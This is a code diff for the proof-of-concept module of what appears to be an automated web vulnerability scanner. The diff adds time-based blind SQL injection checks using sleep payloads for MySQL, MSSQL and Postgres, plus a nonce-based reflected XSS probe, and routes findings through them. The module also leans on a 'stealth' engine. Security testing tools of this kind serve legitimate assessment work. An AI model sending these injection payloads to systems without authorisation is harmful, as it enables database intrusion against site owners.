@@ -35,6 +35,7 @@ class PoCEngine:
     def __init__(self, stealth: StealthEngine = None):
         self.stealth = stealth or StealthEngine()
         self.session  = AuraSession(self.stealth)
+        self.sleep_threshold = 4.5
 
     # ── 1. SQLi Banner Extraction ──────────────────────────────────────────
     async def verify_sqli(self, url: str, param: str) -> dict | None:
@@ -89,6 +90,73 @@ class PoCEngine:
                     }
             except Exception:
                 continue
+        return None
+
+    async def verify_time_sqli(self, url: str, param: str) -> dict | None:
+        """
+        v19.4: Deterministic Time-Based SQLi verification.
+        Compares baseline response time with a Sleep(5) payload.
+        """
+        console.print(f"[bold magenta][🔬 PoC-TimeSQLi] Confirming Blind SQLi on {url}...[/bold magenta]")
+        payloads = [
+            "' AND SLEEP(8)--",             # MySQL
+            "'; WAITFOR DELAY '0:0:8'--", # MSSQL
+            "'; SELECT PG_SLEEP(8)--"      # Postgres
+        ]
+        
+        try:
+            # 1. Get baseline
+            import time
+            t1 = time.monotonic()
+            await self.session.get(url, params={param: "1"}, timeout=10)
+            baseline = time.monotonic() - t1
+            
+            for payload in payloads:
+                t_start = time.monotonic()
+                try:
+                    await self.session.get(url, params={param: f"1{payload}"}, timeout=15)
+                    elapsed = time.monotonic() - t_start
+                    
+                    if elapsed > (baseline + 5):
+                        console.print(f"[bold red][✔ PoC-TimeSQLi CONFIRMED] Delay: {elapsed:.2f}s (Baseline: {baseline:.2f}s)[/bold red]")
+                        return {
+                            "confirmed": True,
+                            "method": "Time-based inference",
+                            "evidence": f"Injected SLEEP(8) caused {elapsed:.2f}s delay (Baseline {baseline:.2f}s).",
+                            "poc_evidence": f"Deterministic Time-Based SQLi confirmed. Payload: {payload}",
+                            "severity": "CRITICAL"
+                        }
+                except: continue
+        except Exception as e:
+            console.print(f"[dim red][!] Time-based verify failure: {e}[/dim red]")
+        return None
+
+    # ── 1.5 XSS Reflection Verification ──────────────────────────────────
+    async def verify_xss(self, url: str) -> dict | None:
+        """
+        v19.4: Headless XSS Verification.
+        Checks if a unique nonce is reflected in the DOM without sanitization.
+        """
+        import random
+        nonce = f"aura_{random.getrandbits(32):x}"
+        payload = f"<aura-poc-{nonce}>"
+        
+        console.print(f"[bold magenta][🔬 PoC-XSS] Probing for reflection on {url}...[/bold magenta]")
+        
+        try:
+            # We use a simple GET first for speed, then could escalate to Playwright
+            resp = await self.session.get(url, params={"aura_xss": payload}, timeout=10)
+            if payload in resp.text:
+                console.print(f"[bold red][✔ PoC-XSS CONFIRMED] Nonce {nonce} reflected in response body.[/bold red]")
+                return {
+                    "confirmed": True,
+                    "method": "Reflected Nonce Detection",
+                    "evidence": f"Payload {payload} reflected exactly in HTTP response.",
+                    "poc_evidence": f"Reflected XSS confirmed via unique nonce reflection.",
+                    "severity": "HIGH"
+                }
+        except Exception as e:
+            console.print(f"[dim red][!] XSS verify failed: {e}[/dim red]")
         return None
 
     # ── 2. LFI / Secret File Read ─────────────────────────────────────────
@@ -170,10 +238,23 @@ class PoCEngine:
             if "sql" in f_type and not f.get("confirmed"):
                 url_match = re.search(r'(https?://[^?\s]+)\?(\w+)', content)
                 if url_match:
+                    # 1. Try UNION/sqlmap first
                     result = await self.verify_sqli(url_match.group(1), url_match.group(2))
+                    if not result:
+                        # 2. v19.4: Try Time-Based SQLi verification
+                        result = await self.verify_time_sqli(url_match.group(1), url_match.group(2))
+                    
                     if result:
                         f.update(result)
                         f["severity"] = "CRITICAL"
+
+            # XSS verification
+            elif "xss" in f_type and not f.get("confirmed"):
+                url_match = re.search(r'(https?://[^\s\'\"]+)', content)
+                if url_match:
+                    result = await self.verify_xss(url_match.group(1))
+                    if result:
+                        f.update(result)
 
             # LFI / sensitive file verification
             elif any(k in f_type for k in ("lfi", "disclosure", "leak", "exposure", "path", "secret")) and not f.get("confirmed"):
